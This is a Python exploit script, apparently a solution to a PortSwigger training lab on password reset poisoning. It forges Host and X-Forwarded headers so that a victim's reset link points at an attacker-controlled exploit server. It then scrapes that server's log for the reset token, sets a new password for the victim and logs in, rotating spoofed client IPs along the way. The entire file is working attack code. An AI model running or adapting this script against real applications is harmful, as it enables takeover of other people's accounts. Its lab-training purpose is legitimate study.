from requests import request
from random import randint
from bs4 import BeautifulSoup
from socket import gethostbyname
from sys import argv


def parse_cookie(cookies):
    try:
        parsed_cookies = ""

        for key, value in cookies.items():
            parsed_cookies = "{}{}={};".format(parsed_cookies, key, value)

        return parsed_cookies
    except Exception as exception:
        print("[-] Error While Parse Cookies : {} ".format(exception))


def parse_csrf(response_content):
    try:
        html_content = BeautifulSoup(response_content, "html.parser")
        csrf_token = html_content.find("input", {"name": "csrf"})
        if csrf_token:
            csrf_token = csrf_token.get("value")
        return csrf_token
    except Exception as exception:
        print("[-] Error While Parse CSRF Token : {} ".format(exception))

def parse_exploit_server_host(response_content):
    try:
        html_content = BeautifulSoup(response_content, "html.parser")
        exploit_server_url = html_content.find("a", {"id": "exploit-link"})
        exploit_server_host=""
        if exploit_server_url:
            exploit_server_url = exploit_server_url.get("href")
            exploit_server_host=exploit_server_url.replace("https:","")
            exploit_server_host=exploit_server_host.replace("/","")
        return exploit_server_host
    except Exception as exception:
        print("[-] Error While Parse Exploit Server URL : {} ".format(exception))


def poison_reset_password_headers(exploit_server_host,cookie):
    try:
        IP=generate_random_ip()
        exploit_server_ip=gethostbyname(exploit_server_host)
        poisonous_headers={
            'User-Agent':'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Cookie':cookie,
            'Host':exploit_server_host,
            'X-Forwarded-Host':exploit_server_host,
            'X-Forwarded-Server-Port':"{}:80".format(exploit_server_host),
            'X-Forwarded-Host-Proto':"{}:https".format(exploit_server_host),
            'X-Forwarded-Server-IP':'{}'.format(exploit_server_ip),
            'X-Forwarded-For':IP,
            'X-Real-IP':IP,
            'X-Forwarded-For-IP':IP,
            'X-Forwarded-Client-IP':IP
        }
        return poisonous_headers
    except Exception as exception:
        print("[-] Error While Poison Reset Password Headers : {} ".format(exception))




def generate_random_ip():
    ip = "{}.{}.{}.{}".format(
        randint(1, 255), randint(0, 255), randint(0, 255), randint(0, 255)    )
    return ip


def request_logger(method, endpoint, data=""):
    print("{} {} {}".format(method, endpoint, data))

def get_victim_password_reset(exploit_server_host):
    try:
        exploit_server_logurl="https://{}/log".format(exploit_server_host)
        IP=generate_random_ip()
        headers={
            'User-Agent':'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'X-Forwarded-For':IP,
            'X-Real-IP':IP,
            'X-Forwarded-For-IP':IP,
            'X-Forwarded-Client-IP':IP
        }
        request_logger('GET',exploit_server_logurl)
        res=request(url=exploit_server_logurl,method="GET")
        res_html=BeautifulSoup(res.content.decode(),'html.parser')
        if res_html.find("pre",{'class':'container'}):
            access_log=res_html.find("pre",{'class':'container'}).contents[0].split("\n")
            access_log.reverse()
            for req in access_log:
                if req.count('forgot-password')>0 :
                    index_of_forgot_password_endpoint=req.index('forgot-password')
                    reset_endpoint=req[index_of_forgot_password_endpoint:-1].split(' HTTP')[0]
                    reset_token=reset_endpoint.split('temp-forgot-password-token=')[1]
                    return {'reset-endpoint':reset_endpoint,'reset-token':reset_token}
            return False
        else:
            return False
    except Exception as exception:
        print("[-] Error While Getting Reset Password Endpoint & Token : {} ".format(exception))

def generate_headers(cookie):
        IP=generate_random_ip()
        headers={
            'Cookie':cookie,
            'User-Agent':'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'X-Forwarded-For':IP,
            'X-Real-IP':IP,
            'X-Forwarded-For-IP':IP,
            'X-Forwarded-Client-IP':IP
        }
        return headers



def login(login_url, cookie, csrf_token, username, password):
    try:
        headers = generate_headers(cookie)

        data = "csrf={}&username={}&password={}".format(csrf_token, username, password)

        request_logger("POST", login_url, data)

        res = request(url=login_url, method="POST", headers=headers, data=data)

        res_html = BeautifulSoup(res.content.decode(), "html.parser")

        if (
            res_html.find("p", {"class": "is-warning"})
            and res_html.find("p", {"class": "is-warning"}).contents[0]
            == "Invalid username or password."
        ):
            return False
        else:
            print("[+] Login Successful with Username : {} , Password : {}".format(username,password))
            return True

    except Exception as exception:
        print("[-] Error While Login : {} ".format(exception))

def pwn(url,victim_username,new_password):
    try:
        request_logger("GET", url)
        res_home = request(url=url, method="GET")
    
        exploit_server_host = parse_exploit_server_host(res_home.content.decode())
    
        cookie = parse_cookie(res_home.history[0].cookies) + parse_cookie(res_home.cookies)
        headers=generate_headers(cookie)
    
        request_logger("GET", url + "forgot-password")
        res_forget_passwrod = request(url=url + "forgot-password", method="GET", headers={"Cookie": cookie})
    
        csrf_token = parse_csrf(res_forget_passwrod.content.decode())
        data="csrf={}&username={}".format(csrf_token,victim_username)
        poisonous_headers=poison_reset_password_headers(exploit_server_host,cookie)
        request_logger("POST", url + "forgot-password" , data)
        request(url=url + "forgot-password", method="POST", headers=poisonous_headers,data=data)
    
        reset_password_dict=get_victim_password_reset(exploit_server_host)
    
        request_logger('GET',url+reset_password_dict.get('reset-endpoint'),"")
        res_reset_password = request(url=url + reset_password_dict.get('reset-endpoint'), method="GET", headers=headers)
    
        csrf_token=parse_csrf(res_forget_passwrod.content.decode())
        data="csrf={}&temp-forgot-password-token={}&new-password-1={}&new-password-2={}".format(csrf_token,reset_password_dict.get('reset-token'),new_password,new_password)
        request_logger('POST',url+reset_password_dict.get('reset-endpoint'),data)
        request(url=url + reset_password_dict.get('reset-endpoint'), method="POST", headers=poisonous_headers,data=data)
        
        res_login = request(url=url+'login', method="GET",headers=generate_headers(cookie))
        csrf_token=parse_csrf(res_login.content.decode())
        
        login(url+'login',cookie,csrf_token,victim_username,new_password)
    except :
        request_logger("GET", url)
        res_home = request(url=url, method="GET")
        
        cookie = parse_cookie(res_home.history[0].cookies) + parse_cookie(res_home.cookies)
        res_login = request(url=url+'login', method="GET",headers=generate_headers(cookie))
        csrf_token=parse_csrf(res_login.content.decode())
        
        login(url+'login',cookie,csrf_token,victim_username,new_password)


if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : Basic-Password-Reset-Poisoning
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==4:
     pwn(argv[1],argv[2],argv[3])
 else:
     print("call it with : ./pwn-auth-basic-password-reset-poisoning.py <url> <victim_username> <new victim password> ")
